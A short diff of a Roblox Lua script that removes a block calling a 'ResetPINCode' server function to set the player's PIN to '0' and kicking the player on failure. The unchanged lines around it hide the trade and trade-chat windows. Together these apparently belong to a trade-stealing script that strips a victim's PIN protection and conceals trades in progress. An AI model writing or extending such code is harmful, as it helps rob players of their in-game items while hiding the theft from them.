@@ -43,18 +43,6 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
     return
 end
 
-local args = {
-    [1] = {
-        ["option"] = "PIN",
-        ["value"] = "0"
-    }
-}
-local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
-if PINReponse ~= "Have a nice day!" then
-    plr:kick("Warning")
-    return
-end
-
 tradeGui.Black.Visible = false
 tradeGui.MiscChat.Visible = false
 tradeCompleteGui.Black.Visible = false
